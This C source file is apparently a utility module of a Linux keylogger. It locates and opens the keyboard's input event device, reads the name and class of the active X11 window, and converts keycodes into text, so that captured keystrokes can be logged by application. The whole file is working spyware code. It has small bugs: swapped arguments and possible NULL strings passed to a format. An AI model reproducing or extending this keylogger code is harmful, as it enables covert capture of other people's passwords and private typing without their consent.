#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include "keylogger/utils/keyboard.h"


static int findKeyboardDeviceFileName(char *keyboardPath) {
    FILE *file = fopen(PROC_INPUT_DEVICES, "r");
    if (!file) {
        fprintf(stderr, "Error opening %s\n", PROC_INPUT_DEVICES);
        return 1;
    }

    char line[256];
    char filename_event[64] = "";
    char *ev = NULL;

    while (fgets(line, sizeof(line), file)) {
        if (line[0] == '\n') {
            if (ev && filename_event[0]) {
                sprintf(keyboardPath, "%s%s", EVENT_PATH, filename_event);
                fclose(file);
                return 0;
            }
            ev = NULL;
            filename_event[0] = '\0';
        } else if (strstr(line, "Handlers=")) {
            char *ptr = strstr(line, "event");
            int event_number;
            if (ptr) {
               sscanf(ptr, "event%d", &event_number);
               snprintf(filename_event, sizeof(filename_event), "event%d", event_number);
            }
        } else if (strstr(line, "EV=120013")) {
            ev = line;
        }
    }
    fclose(file);
    return 1;
}

static int get_window_property(Display *display, Window window, Atom atom, unsigned char **prop) {
    Atom type;
    int format;
    unsigned long nitems, bytes_after;

    int status = XGetWindowProperty(display, window, atom, 0, ~0L, False, AnyPropertyType,
                                    &type, &format, &nitems, &bytes_after, prop);
    if (status != Success || *prop == NULL) {
        return 1;
    }

    return 0;
}

static void set_active_window_name(const char *window_name, const char *class_name, char **res) {
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "%s: %s", class_name, window_name);
    *res = strdup(tmp);
}

int get_active_window(Display *display, char **window) {
    Atom net_active_window = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
    Atom wm_class = XInternAtom(display, "WM_CLASS", False);
    Atom wm_name = XInternAtom(display, "_NET_WM_NAME", False);

    Window root = DefaultRootWindow(display);
    unsigned char *prop = NULL;

    if (get_window_property(display, root, net_active_window, &prop) != 0) {
        return 1;
    }

    Window active_window = *(Window *)prop;
    XFree(prop);

    char *class_name = NULL;
    char *window_name = NULL;

    get_window_property(display, active_window, wm_class, (unsigned char **)&class_name);
    get_window_property(display, active_window, wm_name, (unsigned char **)&window_name);

    if (class_name && window_name) {
        set_active_window_name(class_name, window_name, window);
        XFree(class_name);
        XFree(window_name);
    } else if (class_name) {
        set_active_window_name(class_name, window_name, window);
        XFree(class_name);
    } else if (window_name) {
        set_active_window_name(class_name, window_name, window);
        XFree(window_name);
    } else {
        set_active_window_name(class_name, window_name, window);
    }

    return 0;
}

const char* get_key_name(xkb_keysym_t keysym) {
    switch (keysym) {
        case XKB_KEY_Return: return "\n";
        case XKB_KEY_Escape: return "[ESC]";
        case XKB_KEY_Tab: return "\t";
        case XKB_KEY_BackSpace: return "[BackSpace]";
        default: return NULL;
    }
}

int get_key_string(struct xkb_state *state, xkb_keycode_t keycode, char *buffer, int buffer_len) {
    xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, keycode);
    const char *name = get_key_name(keysym);
    if (name) {
        strncpy(buffer, name, buffer_len - 1);
        buffer[buffer_len - 1] = '\0';
        return 0;
    }

    int len = xkb_state_key_get_utf8(state, keycode, buffer, buffer_len);
    if (len == 0){
        char keysym_name[64];
        xkb_keysym_get_name(keysym, keysym_name, sizeof(keysym_name));
        snprintf(buffer, buffer_len, "[%s]", keysym_name);
        return 0;
    }
    if (len + 1 > buffer_len){
        return 1;
    }
    return 0;
}

int open_file_event_keyboard(int *fd){
    char keyboard_device[128];
    if (findKeyboardDeviceFileName(keyboard_device)) {
        fprintf(stderr, "Keyboard device not found\n");
        return 1;
    }
    *fd = open(keyboard_device, O_RDONLY);
    if (*fd == -1){
        fprintf(stderr, "Error open file event keyboard\n");
        return 1;
    }
    return 0;
}
